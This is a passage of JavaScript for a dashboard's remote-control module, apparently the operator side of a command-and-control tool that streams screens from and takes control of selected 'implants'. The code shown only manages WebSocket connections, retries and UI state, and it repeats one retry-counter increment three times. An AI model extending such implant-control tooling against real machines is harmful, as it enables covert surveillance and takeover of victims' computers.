                    document.removeEventListener('websocket-error', this._boundHandlers.error);
                }
                
                // Reset boundHandlers to prevent memory leaks
                this._boundHandlers = null;
            }
            
            // Reset initialization flag to allow re-initialization if needed
            this._listenersInitialized = false;
            
            // Additional cleanup for WebSocketManager ready handler
            if (this._handleWebSocketManagerReady) {
                document.removeEventListener('websocket-manager-ready', this._handleWebSocketManagerReady);
                this._handleWebSocketManagerReady = null;
            }
            
            // Clear any intervals
            if (this._verificationInterval) {
                clearInterval(this._verificationInterval);
                this._verificationInterval = null;
            }
            
            // Remove all potentially stale handlers
            const events = ['websocket-ready', 'websocket-disconnected', 'websocket-error'];
            if (document._eventListeners) {
                events.forEach(event => {
                    const handlers = document._eventListeners[event];
                    if (handlers && handlers.length > 0) {
                        // Get a copy of the handlers to avoid modification during iteration
                        const handlersCopy = [...handlers];
                        
                        // Check if any handlers contain this module's methods
                        handlersCopy.forEach(handler => {
                            // Try to determine if this is one of our handlers that wasn't properly cleaned up
                            // This is a best effort approach since bound functions don't expose their target
                            if (handler && handler.name && 
                                (handler.name.includes('bound') || 
                                 handler.toString().includes('RemoteControlModule'))) {
                                console.log(`Removing potentially stale handler for ${event}`);
                                document.removeEventListener(event, handler);
                            }
                        });
                    }
                });
            }
        } catch (error) {
            console.error('Error cleaning up event listeners:', error);
        }
    },
    
    // Handle disconnection cleanup
    _handleDisconnection() {
        // Log the disconnection and current state
        console.log(`Handling disconnection cleanup. Streaming: ${this.isStreaming}, Control active: ${this.isControlActive}`);
        
        // Store streaming state to potentially restart on reconnection
        const wasStreaming = this.isStreaming;
        
        // Properly clean up screenshot interval
        if (this.screenshotInterval) {
            clearInterval(this.screenshotInterval);
            this.screenshotInterval = null;
        }
        
        // Disable remote control immediately
        if (this.isControlActive) {
            this.isControlActive = false;
            
            // Update UI
            const enableControlBtn = document.getElementById('enable-control');
            const disableControlBtn = document.getElementById('disable-control');
            if (enableControlBtn) enableControlBtn.disabled = true;
            if (disableControlBtn) disableControlBtn.disabled = true;
            
            // Remove focus from screen capture
            const screenCapture = document.getElementById('screen-capture');
            if (screenCapture) {
                screenCapture.blur();
                screenCapture.classList.remove('control-active');
            }
        }
    },
    
    // WebSocket disconnected event handler
    handleWebSocketDisconnectedEvent(event) {
        try {
            console.log('RemoteControlModule detected websocket-disconnected event', event ? 'Event data present' : 'No event data');
            
            // Ensure 'this' context is RemoteControlModule
            if (this !== RemoteControlModule) {
                console.warn('handleWebSocketDisconnectedEvent called with incorrect context, fixing...');
                return RemoteControlModule.handleWebSocketDisconnectedEvent.call(RemoteControlModule, event);
            }
            
            // Track this event for debugging
            this._logConnectionActivity('event', 'websocket-disconnected');
            
            // Handle the disconnection 
            this.handleWebSocketConnection(false);
            
            // Stop any active streaming
            if (this.isStreaming) {
                console.log('WebSocket disconnected, stopping screen capture stream');
                this.stopScreenStream();
            }
            
            // Disable remote control if active
            if (this.isControlActive) {
                console.log('WebSocket disconnected, disabling remote control');
                this.disableRemoteControl();
            }
            
            // Show a notification to the user
            if (typeof dashboard !== 'undefined' && dashboard.showNotification) {
                dashboard.showNotification('WebSocket disconnected. Remote control features may be unavailable.', 'warning');
            }
        } catch (error) {
            console.error('Error in handleWebSocketDisconnectedEvent:', error);
        }
    },
    
    // WebSocket ready event handler with proper scoping
    handleWebSocketReadyEvent(event) {
        try {
            console.log('RemoteControlModule detected websocket-ready event.', event ? 'Event data present' : 'No event data');
            
            // Ensure 'this' context is RemoteControlModule
            if (this !== RemoteControlModule) {
                console.warn('handleWebSocketReadyEvent called with incorrect context, fixing...');
                return RemoteControlModule.handleWebSocketReadyEvent.call(RemoteControlModule, event);
            }
            
            // Track this event for debugging
            this._logConnectionActivity('event', 'websocket-ready');
            
            // If already initialized, just update the connection state
            if (this.initialized) {
                console.log('Module already initialized, updating connection state');
                this.handleWebSocketConnection(true);
                
                // If an implant is already selected, trigger an update for its system info
                if (this.selectedImplant) {
                    console.log('WebSocket ready, triggering system info update for selected implant:', this.selectedImplant);
                    this.updateSystemInfo();
                }
                return;
            }
            
            // Not initialized yet, attempt initialization
            if (window.WebSocketManager && WebSocketManager.socket) {
                try {
                    this.init(WebSocketManager.socket);
                    
                    // After initialization, update any selected implant
                    if (this.selectedImplant) {
                        console.log('WebSocket ready, triggering system info update for selected implant:', this.selectedImplant);
                        setTimeout(() => this.updateSystemInfo(), 500);
                    }
                } catch (initError) {
                    console.error('Error initializing RemoteControlModule:', initError);
                    dashboard.showNotification('Error initializing remote control. Please refresh the page.', 'danger');
                }
            } else {
                console.warn('WebSocketManager not available during websocket-ready event');
                
                // Schedule retry
                setTimeout(() => {
                    if (window.WebSocketManager && WebSocketManager.socket) {
                        console.log('Retrying initialization after delay');
                        this.init(WebSocketManager.socket);
                    }
                }, 1000);
            }
        } catch (error) {
            console.error('Error handling WebSocket ready event:', error);
            
            // Try to recover by forcing reconnection after a delay
            setTimeout(() => {
                if (WebSocketManager && typeof WebSocketManager.reconnect === 'function') {
                    WebSocketManager.reconnect();
                }
            }, 2000);
        }
    },
    
    // Handle WebSocket connection state changes
    handleWebSocketConnection(isConnected) {
        try {
            this._logConnectionActivity('connection', isConnected ? 'connected' : 'disconnected');
            this.isConnected = isConnected;
            
            // Update UI elements based on connection state
            const connectionStatus = document.getElementById('connection-status');
            if (connectionStatus) {
                const statusIndicator = connectionStatus.querySelector('.connection-indicator');
                if (statusIndicator) {
                    statusIndicator.className = 'connection-indicator';
                    statusIndicator.classList.add(isConnected ? 'connected' : 'disconnected');
                }
                
                const statusText = connectionStatus.querySelector('#connection-text');
                if (statusText) {
                    statusText.textContent = isConnected ? 'Connected' : 'Disconnected';
                    statusText.className = isConnected ? 'text-success' : 'text-danger';
                }
            }
            
            // Enable/disable buttons based on connection state
            const captureScreenBtn = document.getElementById('capture-screen');
            const startStreamBtn = document.getElementById('start-stream');
            
            if (captureScreenBtn) captureScreenBtn.disabled = !isConnected;
            if (startStreamBtn) startStreamBtn.disabled = !isConnected;
            
            // When disconnected, ensure we stop streaming and disable control
            if (!isConnected) {
                this.stopScreenCapture();
                this.disableRemoteControl();
            }
        } catch (error) {
            console.error('Error updating connection state:', error);
        }
    },
    
    // Static initialization method to be called once on page load
    initialize() {
        // Add a unique ID for this initialization attempt to track it
        const initId = new Date().getTime();
        console.log(`RemoteControlModule.initialize() called. Attempt ID: ${initId}`);
        
        // Check if already initialized or initialization is in progress
        if (this.initialized) {
            console.log(`Initialization attempt ${initId}: Already initialized, skipping.`);
            return;
        }
        
        if (this.initializationInProgress) {
            console.log(`Initialization attempt ${initId}: Already in progress, will check again in 500ms.`);
            // If in progress for too long, it might be stuck - try again after a delay
            if (!this._initTimeoutId) {
                this._initTimeoutId = setTimeout(() => {
                    this._initTimeoutId = null;
                    if (!this.initialized && this.initializationInProgress) {
                        const timeSinceInitStarted = this._initStartTime ? (new Date().getTime() - this._initStartTime) : 'unknown';
                        console.warn(`Initialization seems stuck for ${timeSinceInitStarted}ms. Resetting and retrying.`);
                        this.initializationInProgress = false;
                        this.initialize();
                    }
                }, 5000); // 5 second timeout for initialization
            }
            return;
        }
        
        // Track when initialization started
        this._initStartTime = new Date().getTime();
        
        // Prevent multiple initialization attempts with a lock
        this.initializationInProgress = true;
        
        try {
            // Double-check for WebSocketManager availability
            if (!window.WebSocketManager) {
                console.warn(`Initialization attempt ${initId}: WebSocketManager not available when initialize() was called`);
                this.initializationInProgress = false;
                return;
            }
            console.log('RemoteControlModule waiting for WebSocketManager initialization');
            
            // Clean up any existing event listeners to prevent duplicates
            this._cleanupEventListeners();
            
            // Setup any required objects for event listener tracking
            this._setupEventListenerTracking();
            
            // Try to initialize immediately if WebSocketManager is available
            this._initializeWithWebSocketManager();
        } catch (error) {
            console.error(`Initialization attempt ${initId}: Error during RemoteControlModule initialization:`, error);
            this.initializationInProgress = false;
            this._initStartTime = null;
            
            // Clear any timeout
            if (this._initTimeoutId) {
                clearTimeout(this._initTimeoutId);
                this._initTimeoutId = null;
            }
            
            try {
                if (typeof dashboard !== 'undefined' && dashboard && dashboard.showNotification) {
                    dashboard.showNotification('Failed to initialize remote control module. Try refreshing the page.', 'error');
                }
            } catch (notificationError) {
                console.error('Error showing notification:', notificationError);
            }
            
            // Schedule a retry after some time
            setTimeout(() => {
                console.log(`Initialization attempt ${initId}: Scheduling retry after failure`);
                if (!this.initialized) {
                    this.initialize();
                }
            }, 5000);
        }
    },
    
    // Private method to initialize with WebSocketManager
    _initializeWithWebSocketManager() {
        // Clear any previous retry timers
        if (this._initTimer) {
            clearTimeout(this._initTimer);
            this._initTimer = null;
        }
        
        try {
            // Check if WebSocketManager is actually defined and available
            if (typeof WebSocketManager === 'undefined' || !WebSocketManager) {
                console.warn('WebSocketManager is not defined');
                this.initializationInProgress = false;
                return false;
            }
            
            // Setup event listeners if WebSocketManager is available
            if (window.WebSocketManager && WebSocketManager.socket) {
                // Initialize the module with the socket
                this.init(WebSocketManager.socket);
                // Mark initialization as complete
                this.initializationInProgress = false;
                this._initStartTime = null;
                this.initializationRetries = 0;
                
                // Clear any initialization timeout
                if (this._initTimeoutId) {
                    clearTimeout(this._initTimeoutId);
                    this._initTimeoutId = null;
                }
                this.initializationRetries = 0;
                
                // Set up a socket watcher to handle WebSocket reconnections
                if (!window._webSocketManagerObserverSet) {
                    window._webSocketManagerObserverSet = true;
                    
                    // Store original socket setter/getter if they exist
                    const originalDescriptor = Object.getOwnPropertyDescriptor(WebSocketManager, 'socket');
                    const originalSetter = originalDescriptor ? originalDescriptor.set : undefined;
                    const originalGetter = originalDescriptor ? originalDescriptor.get : undefined;
                    
                    // Define our custom property
                    Object.defineProperty(window.WebSocketManager, 'socket', {
                        set: function(newSocket) {
                            // Call original setter if it exists
                            if (originalSetter) {
                                originalSetter.call(this, newSocket);
                            } else {
                                this._socket = newSocket;
                            }
                            
                            // When a new socket is assigned, reinitialize the RemoteControlModule
                            if (newSocket) {
                                console.log('WebSocketManager socket replaced, updating RemoteControlModule');
                                setTimeout(() => {
                                    if (!RemoteControlModule.initialized) {
                                        RemoteControlModule.init(newSocket);
                                    } else {
                                        // If already initialized, just update the socket reference
                                        RemoteControlModule.socket = newSocket;
                                        
                                        // Update connection status
                                        if (newSocket.readyState === WebSocket.OPEN) {
                                            RemoteControlModule.handleWebSocketConnection(true);
                                        }
                                    }
                                }, 0);
                            }
                        },
                        get: function() {
                            // Call original getter if it exists
                            if (originalGetter) {
                                return originalGetter.call(this);
                            } else {
                                return this._socket;
                            }
                        },
                        configurable: true
                    });
                }
                
                console.log('RemoteControlModule successfully initialized with WebSocketManager');
                return true;
            } else if (typeof WebSocketManager !== 'undefined') {
                // WebSocketManager exists but socket isn't ready
                console.log('WebSocketManager exists but socket is not ready yet');
                
                // Try attaching to socket once it's created
                if (!this._socketWatcher && typeof WebSocketManager === 'object') {
                    this._createSocketWatcher();
                }
                
                // Increase retry count
                this.initializationRetries++;
                
                // Increase retry count
                this.initializationRetries++;
                
                // Otherwise wait for WebSocketManager to become available
                this.initializationRetries++;
                
                // Check if max retries has been reached
                if (this.initializationRetries >= this.maxInitializationRetries) {
                    console.error(`Failed to find WebSocketManager.socket after ${this.initializationRetries} retries. Giving up.`);
                    this.initializationInProgress = false;
                    this.initializationRetries = 0;
                    return false;
                }
                
                // Try to initialize after a delay with exponential backoff
                const delay = Math.min(10000, 500 * Math.pow(1.2, this.initializationRetries));
                console.log(`Will retry initialization in ${Math.round(delay)}ms (attempt ${this.initializationRetries}/${this.maxInitializationRetries})`);
                
                this._initTimer = setTimeout(() => {
                    this._initializeWithWebSocketManager();
                }, delay);
                return false;
            }
        } catch (error) {
            console.error('Error during RemoteControlModule initialization:', error);
            this.initializationInProgress = false;
            
            // Show UI error notification
            try {
                if (typeof dashboard !== 'undefined' && dashboard && dashboard.showNotification) {
                    dashboard.showNotification('Failed to initialize remote control module. Try refreshing the page.', 'error');
                }
            } catch (notificationError) {
                console.error('Error showing notification:', notificationError);
            }
            
            // Clear any initialization timeout
            if (this._initTimeoutId) {
                clearTimeout(this._initTimeoutId);
                this._initTimeoutId = null;
            }
            
            // Reset initialization state
            this.initializationInProgress = false;
            this._initStartTime = null;
            this.initializationRetries = 0;
            
            // Schedule a recovery attempt
            setTimeout(() => {
                console.log('Attempting recovery after initialization failure');
                if (!this.initialized) {
                    this.initialize();
                }
            }, 10000); // Wait 10 seconds before recovery attempt
            
            return false;
        }
    },
    
    // Create a watcher for the WebSocketManager.socket property
    _createSocketWatcher() {
        console.log('Setting up WebSocketManager.socket watcher');
        this._socketWatcher = true;
        
        // Check if we can use Object.defineProperty
        if (WebSocketManager && Object.defineProperty) {
            // Save the original socket if it exists
            const originalSocket = WebSocketManager.socket;
            
            // Define property with custom getter/setter
            Object.defineProperty(WebSocketManager, 'socket', {
                configurable: true,
                get: function() {
                    return this._internalSocket;
                },
                set: function(newSocket) {
                    this._internalSocket = newSocket;
                    console.log('WebSocketManager.socket was set');
                    
                    // Initialize RemoteControlModule with the new socket
                    if (newSocket && typeof RemoteControlModule === 'object' && !RemoteControlModule.initialized) {
                        console.log('Socket watcher detected new socket, initializing RemoteControlModule');
                        setTimeout(() => {
                            try {
                                RemoteControlModule.init(newSocket);
                            } catch (e) {
                                console.error('Error initializing RemoteControlModule from socket watcher:', e);
                            }
                        }, 0);
                    }
                }
            });
            
            // Set the initial value if there was one
            if (originalSocket) {
                WebSocketManager._internalSocket = originalSocket;
            }
        }
    },
    
    /**
     * Log connection activity for tracking and debugging purposes
     * @param {string} from - Previous state or 'event'
     * @param {string} to - New state or event name
     * @param {Error|string} [error] - Optional error object or message
     * @private
     */
    _logConnectionActivity(from, to, error) {
        // Create or append to connection log
        if (!this._connectionLog) {
            this._connectionLog = [];
        }
        
        // Keep log size reasonable
        if (this._connectionLog.length > 100) {
            this._connectionLog.shift();
        }
        
        // Add entry
        this._connectionLog.push({
            timestamp: new Date().toISOString(),
            from: from,
            to: to,
            error: error ? (error.message || error) : undefined,
            readyState: window.WebSocketManager && WebSocketManager.socket ? 
                WebSocketManager.socket.readyState : 'undefined'
        });
        
        // Log to console for immediate debugging
        if (error) {
            console.debug(`Connection activity: ${from} → ${to} (Error: ${error.message || error})`);
        } else {
            console.debug(`Connection activity: ${from} → ${to}`);
        }
    }
};

// Make the module available globally
window.RemoteControlModule = RemoteControlModule;

// Register with WebSocketManager when it becomes available
document.addEventListener('DOMContentLoaded', function() {
    console.log('Setting up RemoteControlModule registration');
    
    // Register with WebSocketManager if it's immediately available
    if (window.WebSocketManager && typeof WebSocketManager.onModuleReady === 'function') {
        console.log('Registering RemoteControlModule with WebSocketManager.onModuleReady');
        WebSocketManager.onModuleReady('RemoteControlModule');
    } else {
        // One-time listener for WebSocketManager readiness
        const onWebSocketManagerReady = function() {
            console.log('WebSocketManager ready event received');
            document.removeEventListener('websocket-manager-ready', onWebSocketManagerReady);
            
            if (window.WebSocketManager && typeof WebSocketManager.onModuleReady === 'function') {
                WebSocketManager.onModuleReady('RemoteControlModule');
            }
        };
        
        document.addEventListener('websocket-manager-ready', onWebSocketManagerReady);
    }
});
